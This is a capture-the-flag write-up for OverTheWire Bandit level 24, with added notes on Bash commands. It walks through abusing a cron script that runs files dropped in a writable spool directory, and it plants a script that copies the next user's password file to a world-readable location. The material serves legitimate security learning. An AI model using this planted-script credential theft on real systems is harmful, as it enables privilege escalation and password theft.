# Bandit Level 24

## Challenge

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

---

## Initial Thoughts

In this level, the challenge again hints that I should look in `/etc/cron.d/` to find the cron jobs being executed. Therefore, I will start by examining `/etc/cron.d/`.

---

## Solution

### Step 1: Examine `/etc/cron.d/`

`/etc/cron.d/` is commonly used to store system-wide cron job definitions.

First, I checked its contents:

```bash
ls -lah /etc/cron.d/
```

There were many files, but the most noticable one was `cronjob_bandit24`. Since the challenge asks us to find the cron jobs being executed, I decided to examine it. The file `cronjob_bandit23` was used in the previous level.

### Step 2: Examine `/etc/cron.d/cronjob_bandit24`

I used `file` to check its file type:

```bash
file /etc/cron.d/cronjob_bandit24
```

It is an ASCII text file, so I used `cat` to examine its contents.

```bash
cat /etc/cron.d/cronjob_bandit24
```

Output:

```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This file defines a system-wide cron job that executes `/usr/bin/cronjob_bandit24.sh` as `bandit24`. This cron job executes the script after the system reboot and every minute. The `&> /dev/null` redirects both `stdout` and `stderr` to `/dev/null`, meaning that the script's normal output and error messages are discarded.

Therefore, I decided to examine the script directly.

### Step 3: Examine `/usr/bin/cronjob_bandit24.sh`

I examined the script using `cat`:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Output:

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

The first command uses `shopt` to enable `nullglob` option of the Bash shell.

The next command assigns the output of `whoami` to the variable `myname`:

```bash
myname=$(whoami)
```

Since the cron job executes the script as `bandit24`, the value of `myname` is `bandit24`.

Next, the script changes its working directory:

```bash
cd /var/spool/"$myname"/foo || exit
```

The script terminates if `cd` fails.

Because the value of `myname` is `bandit24`, the working directory becomes `/var/spool/bandit24/foo`.

Then, the script prints a message before processing the files in that directory.

The loop iterates through all entries in the working directory, including hidden entries:

```bash
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

The condition:

```bash
[ "$i" != "." ] && [ "$i" != ".." ]
```

ensures that `.` and `..` are not processed.

For each entry `i`, the script:

1. Inspects its owner using:

```bash
stat --format "%U" "./$i"
```

2. Stores the owner's username in the variable `owner`.

3. Checks whether the entry:

- is owned by `bandit23`
- is a regular file

```bash
[ "${owner}" = "bandit23" ] && [ -f "$i" ]
```

4. If both conditions are true, executes the file with a maximum runtime of 60 seconds:

```bash
timeout -s 9 60 "./$i"
```

If the program is still running after 60 seconds, `timeout` sends signal `9` (`SIGKILL`).

5. Removes the entry afterward:

```bash
rm -rf "./$i"
```

In short, the script executes regular files owned by `bandit23` and then removes the processed entries.

I realized that this script runs with the privileges of `bandit24` and executes files owned by `bandit23` that are placed in `/var/spool/bandit24/foo`. Therefore, I though I could inject a script there that reads `bandit24`'s password and writes it to a location that I can access.

To make sure this was possible, I checked the permission of `/var/spool/bandit24/foo`:

```bash
stat /var/spool/bandit24/foo
```

Its permissions were `drwxrwx-wx`. This means that others have write and execute permissions, allowing them to create entries inside the directory and access known paths within it.

### Step 4: Inject script in `/var/spool/bandit24/foo`

I created a temporary directory:

```bash
mkdir /tmp/Piggeright
```

Because the injected script would run as `bandit24`, I needed to ensure that `bandit24` could create the output file inside this directory:

```bash
chmod 777 /tmp/Piggeright
```

I then created a script named `inject.sh` using `vim`:

```bash
vim /tmp/Piggeright/inject.sh
```

The script reads `bandit24`'s password and writes it to `password.txt`:

```bash
#!/bin/bash
cat "/etc/bandit_pass/bandit24" > "/tmp/Piggeright/password.txt"
```

Next, I made the script executable:

```bash
chmod 777 /tmp/Piggeright/inject.sh
```

> `777` is more permission than necessary, but it is fine for Bandit practice.

Then, I injected the script into `/var/spool/bandit24/foo`:

```bash
mv /tmp/Piggeright/inject.sh /var/spool/bandit24/foo
```

The cron job then processed the script. Since it was owned by `bandit23` and was a regular executable file, the cron script executed it as `bandit24`.

The injected script therefore ran:

```bash
cat "/etc/bandit_pass/bandit24" > "/tmp/Piggeright/password.txt"
```

Because the script was running as `bandit24`, it had permission to read `/etc/bandit_pass/bandit24`.

Finally, I read `password.txt`:

```bash
cat /tmp/Piggeright/password.txt
```

I then retrieved the password for the next level.

## Key Takeaways

### shopt

`shopt` is a Bash builtin command used to view and change Bash shell options. It isn't a standalone program like `ls` or `cat`.

1. Display the current state of many Bash options

```bash
shopt
```

```text
autocd          off
cdspell         off
checkjobs       off
nullglob        off
...
```

2. Enable/Disable an option

```bash
shopt -s nullglob
```

```bash
shopt -u nullglob
```

- `-s` → set/enable
- `-u` → unset/disable
- `nullglob` → the option being enabled/disabled

3. Check one option

```bash
shopt nullglob
```

4. Options

- `nullglob` — causes unmatched wildcard patterns to expand to nothing instead of remaining as literal text.

### `&&` and `||` in control flow

- `[command_1] && [command_2]` — if `[command_1]` succeeds, `[command_2]` executes.
- `[command_1] || [command_2]` — if `[command_1]` fails, `[command_2]` executes.
- `[command_1] && [command_2] || [command_3]` — `[command_2]` executes if `[command_1]` succeeds; `[command_3]` executes if either `[command_1]` or `[command_2]` fails.

### stat

Display detailed information about a file or directory.

Syntax:

```bash
stat [options] [file]
```

Output:
```text
  File: file.txt
  Size: 123        Blocks: 8          IO Block: 4096   regular file
Device: ...        Inode: 123456      Links: 1
Access: (0644/-rw-r--r--)  Uid: (1000/user)   Gid: (1000/user)
Access: 2026-08-29 10:00:00
Modify: 2026-08-29 09:30:00
Change: 2026-08-29 09:30:00
```

`[options]`

- `--format "[info]"` — get a specific information.

`[info]`

- `%U` — file owner
- `%u` — numeric UID
- `%A` — permission
- `%a` — permission number

### ls

`[options]`

- `-d` — treat the directory itself as the item to display, rather than listing what's inside it.

### File test operator

- `[ -f file.txt ]` — check whether the path exists and is a regular file.
- `[ -d mydir ]` — check whether the path exists and it is a directory.

### `timeout`

Execute a command or script and automatically terminates it if it runs longer than a specified time limit.

Syntax:

```bash
timeout [options] [duration] [command/script]
```

`[duration]`

- `s` — seconds (default)
- `m` — minutes
- `h` — hours
- `d` — days
- Example: `10` or `10s` (10 seconds), `5m` (5 minutes)

`[options]`

- `-k [duration]` — sends `SIGKILL` after extra delay if `SIGTERM` fails
- `-s [signal]` — specifies initial signal

`[signal]`

- `SIGTERM` or `15` — (default signal) requests a graceful termination
- `SIGINT` or `2` — simulates pressing `Ctrl`+`C` in the terminal
- `SIGHUP` or `1` — simulates a lost terminal session or disconnected modem
- `SIGKILL` or `9` — immediately terminates the process at the OS level

### vim

In Linux, `vim` (Vi Improved) is a powerful terminal-based text editor. You can use it to create and edit files directly in the command line.

Syntax:

```bash
vim [file]
```

- If `[file]` exists → `vim` opens it.
- If it doesn't exist → `vim` creates it.

**Modes**

1. Normal mode: When you open Vim, you start in Normal mode.
  - `i` + `Enter` → enter Insert mode
  - `dd` + `Enter` → delete a line
  - `yy` + `Enter` → copy a line
  - `:q` + `Enter` → quit
  - `:w` + `Enter` → write (save)
  - `:wq` + `Enter` → write and quit
  - `:q!` + `Enter` → quit without writing

2. Insert mode
  - `Esc` → return to Normal mode

## References

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)
